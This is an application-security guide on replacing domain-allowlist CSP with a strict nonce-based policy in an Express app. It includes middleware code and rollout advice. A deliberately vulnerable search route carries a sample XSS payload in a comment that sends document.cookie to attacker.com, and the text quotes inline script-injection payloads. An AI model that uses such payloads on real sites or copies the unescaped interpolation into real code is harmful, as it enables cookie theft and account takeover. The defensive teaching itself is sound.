---
title: "Content Security Policy: Deploying Strict Nonce-Based Policies Against XSS"
description: "Why domain-allowlist CSP is bypassable and how to deploy a strict, nonce-based Content Security Policy as a defense-in-depth backstop against XSS, with a working Express implementation and rollout strategy."
categorySlug: "appsec-threats"
articleType: "GUIDE"
tags:
  - "csp"
  - "content-security-policy"
  - "xss"
  - "nonce"
  - "strict-dynamic"
  - "web-security-headers"
---

# Content Security Policy (CSP): Deploying Strict Nonce-Based Policies to Neutralize XSS

Cross-Site Scripting (XSS) occurs when an application renders untrusted, unescaped user input inside the browser context, allowing an attacker to execute malicious client-side JavaScript. While defensive encoding and context-aware escaping are necessary, the complexity of modern DOM templating engines means slip-ups are inevitable.

**Content Security Policy (CSP)** is the architectural defense-in-depth safety net. By instructing the browser exactly which scripts, styles, and connections are authorized, CSP guarantees that even if an attacker successfully injects a malicious payload, the browser refuses to compile or execute it.

---

## The Problem: The Inevitability of Code Injection

XSS is incredibly diverse — spanning stored, reflected, and DOM-based vectors. Once an attacker gets a script block like `<script>evil()</script>` or an inline handler like `<img src=x onerror=evil()>` to parse, they gain full read/write access over the DOM, can capture keystrokes, modify page content, and exfiltrate auth tokens or anti-CSRF values.

Relying solely on developers to remember to sanitize every data insertion point is a losing battle. CSP addresses this risk at the platform level by restricting browser capabilities via a response header (`Content-Security-Policy`).

```text
                    +------------------------------------------+
                    |  Injected Payload: <script>steal()</script>|
                    +------------------------------------------+
                                         |
                                         v
                    +------------------------------------------+
                    |             Victim Browser               |
                    +------------------------------------------+
                                         |
                     Reads Header: Content-Security-Policy:
                     script-src 'nonce-RND123' 'strict-dynamic';
                                         |
                     Is script tag annotated with nonce="RND123"?
                                    /         \
                                [ Yes ]      [ No ]
                                  /             \
                    Permit Script Compile     BLOCK SCRIPT &
                                              Dispatch Report to API!
```

Legacy CSP models used domain allowlists (e.g., `script-src 'self' https://apis.google.com`). Research has repeatedly shown domain allowlists are bypassable via JSONP endpoints, open redirects, or script-hosting facilities located on those very whitelisted domains. Modern appsec practice mandates a **strict CSP** model built around **cryptographic nonces** (number used once).

---

## Vulnerable Code: The Defenseless UI

```javascript
// VULNERABLE EXPRESS PAGE RENDERER
const express = require('express');
const app = express();

app.get('/search', (req, res) => {
    const { q } = req.query; // e.g., ?q=<script>fetch('https://attacker.com?c=' + document.cookie)</script>

    // VULNERABILITY: Direct interpolation of unescaped input + no security headers.
    res.send(`
        <html>
        <body>
            <h1>Search Results for: ${q}</h1>
            <p>0 results found.</p>
        </body>
        </html>
    `);
});
```

Because there is no CSP header, the browser compiles and executes the injected script tag immediately, exfiltrating any non-`HttpOnly` cookies.

---

## Secure Mitigation: Implementing Strict Nonce-Based CSP

A modern, bulletproof CSP configuration uses the following directives:

1. **`default-src 'none'`** — deny-by-default for all resource types.
2. **`script-src 'nonce-{RANDOM}' 'strict-dynamic'`** — only execute scripts annotated with the exact matching, cryptographically secure nonce generated fresh for *this specific request*. `'strict-dynamic'` lets safely loaded scripts load their own dependencies without needing a massive domain allowlist.
3. **`object-src 'none'`** — disables plugins (Flash, Java applets, PDF viewers) that can bypass standard script execution controls.
4. **`base-uri 'none'`** — prevents injection of `<base>` tags that redirect relative URL paths (like your own script bundle paths) to an attacker-controlled domain.
5. **`report-uri` / `report-to`** — directs the browser to send structured JSON reports of blocked script executions to a monitoring endpoint, giving instant visibility into active exploitation or misconfiguration.

### Production-Ready CSP Middleware (Node.js)

```javascript
const express = require('express');
const crypto = require('crypto');
const app = express();

/**
 * Middleware to generate a cryptographically secure nonce for the request lifecycle,
 * and construct the matching strict CSP header.
 */
app.use((req, res, next) => {
    // Step 1: Generate a high-entropy 128-bit random nonce, base64 encoded
    const nonce = crypto.randomBytes(16).toString('base64');

    // Bind the nonce to response locals so templates can read it
    res.locals.nonce = nonce;

    // Step 2: Assemble the strict CSP directives
    const cspPolicy = [
        "default-src 'none'", // Fail closed for all resource types

        // Only allow scripts with the correct cryptographic nonce.
        // 'unsafe-inline' is ignored by modern browsers once a nonce is present —
        // it's kept only as a no-op fallback for very old legacy browsers.
        `script-src 'nonce-${nonce}' 'strict-dynamic' 'unsafe-inline' https: http:`,

        "style-src 'self' 'unsafe-inline'",
        "img-src 'self' data: https:",
        "connect-src 'self'",
        "object-src 'none'",
        "base-uri 'none'",
        "frame-ancestors 'none'", // Restrict framing to prevent clickjacking
        "report-uri /api/v1/csp-violations"
    ].join('; ');

    res.setHeader('Content-Security-Policy', cspPolicy);
    next();
});

// SECURE SEARCH ROUTE
app.get('/search', (req, res) => {
    const q = req.query.q || '';

    // Escape utility to handle standard HTML context escaping
    const safeQ = q.replace(/</g, "&lt;").replace(/>/g, "&gt;");

    // Even if an attacker somehow bypasses the escape replacement,
    // any script tag they inject lacking the matching request-specific nonce will be blocked.
    res.send(`
        <html>
        <head>
            <script nonce="${res.locals.nonce}" src="/js/app.js"></script>
        </head>
        <body>
            <h1>Search Results for: ${safeQ}</h1>
            <p>0 results found.</p>
        </body>
        </html>
    `);
});

// CSP Violations Logging Endpoint
app.post('/api/v1/csp-violations', express.json({ type: 'application/csp-report' }), (req, res) => {
    const report = req.body;
    console.warn(`[SECURITY ALERT] CSP Violation Detected:`, report);
    return res.sendStatus(204);
});
```

---

## Architectural Protections

1. **Eradicate inline event handlers:** Remove inline script code (`onclick="..."`, `href="javascript:..."`) from markup entirely. Strict CSP blocks these from compiling regardless of nonce. Use `addEventListener` in external JS files instead.
2. **Compile-time hash generation:** For SPAs without a per-request SSR nonce injection point, generate SHA-256 hashes of static script bundles at build time and whitelist them (`script-src 'sha256-abc...'`).
3. **Deploy in report-only mode first:** When introducing CSP to a legacy application, start with `Content-Security-Policy-Report-Only`. This logs violations to your reporting API without blocking execution, letting you debug and refine the policy before enforcing it.
